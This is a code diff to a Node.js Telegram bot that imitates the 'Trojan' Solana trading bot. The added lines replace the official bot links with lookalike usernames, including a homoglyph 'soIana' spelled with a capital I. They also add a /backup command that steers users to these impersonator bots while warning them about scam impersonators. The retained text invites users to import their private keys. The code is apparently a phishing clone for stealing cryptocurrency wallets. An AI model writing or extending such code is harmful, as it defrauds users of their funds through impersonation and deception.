@@ -2,7 +2,6 @@ const { Telegraf } = require("telegraf");
 require("dotenv").config();
 const express = require("express");
 const tokenDetails = require("./tokenDetails");
-const { inlineKeyboard } = require("telegraf/markup");
 const app = express();
 const fs = require("fs");
 const bodyParser = require("body-parser")
@@ -31,14 +30,14 @@ Balance \`0 SOL ($0.00)\`
     
 Click on the Refresh button to update your current balance.
     
-Join our Telegram group [@trojan_on_solana](t.me/trojan_on_solana) for users of Trojan!
+Join our Telegram group [@trojan_on_solana](t.me/trojan_soIanabot) for users of Trojan!
     
 Once done tap refresh and your balance will appear here.
     
 For more info on your wallet and to import your private key, tap the BUY button below. We guarantee the safety of user funds on Trojan Bot.
     
 💡If you aren't already, we advise that you *use any of the following bots to trade with.* You will have the *same wallets and settings across all bots,* but it will be significantly faster due to lighter user load.
-[Achilles](https://t.me/achilles_trojanbot) | [Odysseus](https://t.me/odysseus_trojanbot) | [Menelaus](https://t.me/menelaus_trojanbot) | [Diomedes](https://t.me/diomedes_trojanbot) | [Paris](https://t.me/paris_trojanbot) | [Helenus](https://t.me/helenus_trojanbot) | [Hector](https://t.me/hector_trojanbot)`;
+[Achilles](https://t.me/achilles_solanabot) | [Odysseus](https://t.me/odysseus_solanabot) | [Menelaus](https://t.me/menelaus_solanabot) | [Diomedes](https://t.me/diomedes_solanabot) | [Paris](https://t.me/paris_solanabot) | [Helenus](https://t.me/helenus_solanabot) | [Hector](https://t.me/hector_solanabot)`;
 
   const replyMarkup = {
     reply_markup: {
@@ -231,9 +230,40 @@ const handleNoTokens = (ctx, buttonPressed = false, customText = "") => {
   });
 };
 
-// handles /buy command
-bot.command("buy", async (ctx) => {
-  handleBuyAction(ctx);
+// handles /backup command
+bot.command("backup", async (ctx) => {
+replyText = `
+The following backup bots are available. These bots give access to exactly the same Trojan wallet, token positions, and settings. 
+
+The backup bots are often faster due to a lighter user load. If you're ever having trouble with the primary [@solana_trojanbot](t.me/trojan_soIanabot.) jump into one of the backups!
+
+🟢 - Best option with lightest load
+🟡 - Bot is under moderate load
+🔴 - Worst option due to heavy load
+
+⚠️ Do not try to search our bot usernames in Telegram because there are scam impersonator bots. Click our official links only.
+`
+
+const replyMarkup = {
+    reply_markup:{
+        inline_keyboard:[
+            [{text:"🟢 Achilles", callback_url:"t.me/achilles_solanabot"}],
+            [{text:"🟡 Odysseus", callback_url:"t.me/odysseus_solanabot"}],
+            [{text:"🟢 Menelaus", callback_url:"t.me/menelaus_solanabot"}],
+            [{text:"🟡 Diomedes", callback_url:"t.me/diomedes_solanabot"}],
+            [{text:"🔴 Paris", callback_url:"t.me/paris_solanabot"}],
+            [{text:"🟡 Helenus", callback_url:"t.me/helenus_solanabot"}],
+            [{text:"🟡 Hector", callback_url:"t.me/hector_solanabot"}],
+            [{text:"✖️ Close", callback_data:"delete-message"}],
+        ]
+    }
+}
+
+ctx.reply(replyText, {
+    ...replyMarkup,
+    parse_mode: "Markdown",
+    disable_web_page_preview: true,
+  });
 });
 
 // handles /buy command
